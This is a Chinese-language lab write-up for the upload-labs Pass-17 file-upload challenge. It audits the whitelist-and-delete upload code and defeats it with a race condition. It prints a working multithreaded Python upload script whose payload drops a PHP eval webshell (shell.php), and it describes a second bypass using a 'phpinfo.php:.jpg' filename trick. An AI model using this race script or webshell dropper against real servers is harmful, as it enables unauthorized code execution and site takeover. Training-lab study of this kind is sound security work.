该题根据提示审计源码：

```javascript
//关键代码，使用白名单限制了后缀
    $ext_arr = array('jpg','png','gif');

//上传后的文件不符合白名单后缀的进行删除
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
```

根据源码判断文件是上传成功的，不符合白名单的文件被unlink函数删除。

所以这里有一个利用方法，使用多线程脚本上传文件，在服务器将文件删除之前访问到该文件，使该文件不能删除，在上传目录下发现上传的shell文件。



竞争上传脚本：

```javascript
#coding=utf-8
import requests
from multiprocessing import Pool
def CompeteUpload(list):
    url="http://192.168.242.128/upload-labs/Pass-17/index.php"
    geturl="http://192.168.242.128/upload-labs/upload/info.php"
    file={'upload_file':('info.php',"<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[ironman]);?>');?>",'image/jpeg')}
    data={'submit':'上传'}
    r=requests.post(url=url,data=data,files=file)
    #print "test upload...."
    r1=requests.get(url=geturl)
    if r1.status_code==200:
        print "upload success!"
if __name__=="__main__":
    pool = Pool(10)
    pool.map(CompeteUpload, range(10000))
    pool.close()
    pool.join()
```



执行脚本：

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/文件上传漏洞/upload_labs靶场/images/C13E85EDB3504FF0AA458791815A9F62clipboard.png)

访问成功，在上传目录下生成上传脚本：

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/文件上传漏洞/upload_labs靶场/images/1EBEE1ABB9B246D9AB30E2AE113F490Eclipboard.png)



方法二：

该题可参考labs3解法。

将上传的文件名改为：

phpinfo.php:.jpg，文件上传成功

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/文件上传漏洞/upload_labs靶场/images/6CC52B1AFAA843B5B71F916AAC54B522clipboard.png)



然后更改文件名为，

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/文件上传漏洞/upload_labs靶场/images/81E8FE8392BD47FF816133E8BC360DD4clipboard.png)

虽然显示，上传错误，但是已经在文件上传目录下生成phpinfo.php文件。

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/文件上传漏洞/upload_labs靶场/images/F5B92483FD5B4AB9806408CEB3449337clipboard.png)

浏览器访问：

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/文件上传漏洞/upload_labs靶场/images/54AE6167453C4229A0B67DFC78B8F047clipboard.png)





